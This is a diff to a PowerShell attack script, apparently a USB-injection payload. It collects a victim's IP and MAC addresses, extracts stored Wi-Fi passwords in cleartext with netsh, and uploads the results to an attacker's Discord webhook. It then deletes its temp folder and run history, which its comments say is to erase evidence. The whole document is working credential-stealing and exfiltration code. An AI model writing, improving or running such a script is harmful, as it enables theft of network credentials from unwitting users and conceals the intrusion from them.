@@ -3,8 +3,10 @@
 # $dc = "YOUR-DISCORD-WEBHOOK"
 
 #------------------------------------------------------------------------------------------------------------------------------------
-New-Item -Path $env:temp -Name "F13C3D8F-8A17-4898-A36A-6294A160288A" -ItemType "directory";
-$FileName = "$env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A/$env:USERNAME-$(get-date -f yyyy-MM-dd).txt"
+$null = New-Item -Path $env:temp -Name "F13C3D8F-8A17-4898-A36A-6294A160288A" -ItemType "directory"
+Set-Location -Path "$env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A"
+
+$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd).txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 # Network info
@@ -34,10 +36,9 @@ $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Sta
 #------------------------------------------------------------------------------------------------------------------------------------
 $output = @"
 
-Public IP: 
-$PubIP
+Public IP: $PubIP
 
-Local IPs:
+Local IPs: 
 $localIP
 
 MAC:
@@ -49,10 +50,10 @@ $output > $FileName
 
 ############################################################################################################################################################
 
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+$null = netsh wlan export profile key=clear; 
 
+Select-String -Path *.xml -Pattern 'keyMaterial'>> $FileName;
 
-$wifiProfiles >> $FileName
 
 ############################################################################################################################################################
 
@@ -83,7 +84,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A/$FileName}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
 #if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
 
 #------------------------------------------------------------------------------------------------------------------------------------
@@ -94,7 +95,9 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:temp/F13C3D8F
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
 # Delete contents of Temp folder 
-rm $env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A/* -r -Force -ErrorAction SilentlyContinue
+Set-Location -Path "$env:temp"
+
+rm $env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
